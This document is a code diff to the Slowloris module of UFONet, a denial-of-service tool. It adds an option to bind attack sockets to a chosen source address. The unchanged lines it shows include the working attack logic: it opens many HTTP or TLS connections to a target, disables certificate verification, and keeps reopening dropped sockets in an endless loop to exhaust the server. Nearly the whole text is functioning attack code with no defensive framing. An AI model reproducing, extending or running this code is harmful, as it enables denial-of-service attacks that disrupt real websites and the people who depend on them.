@@ -16,7 +16,7 @@ except:
     from urllib.parse import urlparse
 
 # UFONet Slow HTTP requests (LORIS) + [AI] WAF Detection
-def setupSocket(self, ip):
+def setupSocket(self, ip, source = None):
     method = random.choice(self.methods)
     port = 80
     if ip.startswith('http://'):
@@ -27,6 +27,10 @@ def setupSocket(self, ip):
        port = 443
     self.user_agent = random.choice(self.agents).strip()
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    if source is not None:
+        sock.bind((source, 0))
+
     sock.settimeout(10)
     if port == 443:
         sock = ssl.wrap_socket(sock, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_TLSv1)
@@ -78,13 +82,13 @@ def setupSocket(self, ip):
                     return
     return sock, ip
 
-def tractor(self, ip, requests): 
+def tractor(self, ip, requests, source = None): 
     n=0
     try:
         for i in range(requests): 
             n=n+1
             try:
-                sock, ip = setupSocket(self, ip)
+                sock, ip = setupSocket(self, ip, source)
                 print("[Info] [AI] [LORIS] Firing 'tractor beam' ["+str(n)+"] -> [CONNECTED!]")
             except:
                 print("[Error] [AI] [LORIS] Failed to engage with 'tractor beam' ["+str(n)+"]")
@@ -92,12 +96,12 @@ def tractor(self, ip, requests):
         while True: # try to abuse HTTP Headers
             for sock in list(self.sockets):
                 try: 
-                    sock, ip = setupSocket(self, ip)
+                    sock, ip = setupSocket(self, ip, source)
                 except socket.error:
                     self.sockets.remove(sock)
             for i in range(requests - len(self.sockets)):
                 print("[Info] [AI] [LORIS] Re-opening closed 'tractor beam' -> [RE-LINKED!]")
-                sock, ip = setupSocket(self, ip)
+                sock, ip = setupSocket(self, ip, source)
                 if sock:
                     self.sockets.append(sock)
     except:
@@ -119,7 +123,7 @@ class LORIS(object):
             self.agents.append(agent)
         self.methods = ['GET', 'POST', 'X-METHOD'] # supported HTTP requests methods
 
-    def attacking(self, target, requests):
+    def attacking(self, target, requests, source = None):
         print("[Info] [AI] Slow HTTP requests (LORIS) is ready to fire: [" , requests, "tractor beams ]")
         try:
             ip = socket.gethostbyname(target)
@@ -134,4 +138,4 @@ class LORIS(object):
                     ip = str(rd)
             except:
                 ip = target
-        tractor(self, ip, requests) # attack with LORIS using threading
+        tractor(self, ip, requests, source) # attack with LORIS using threading
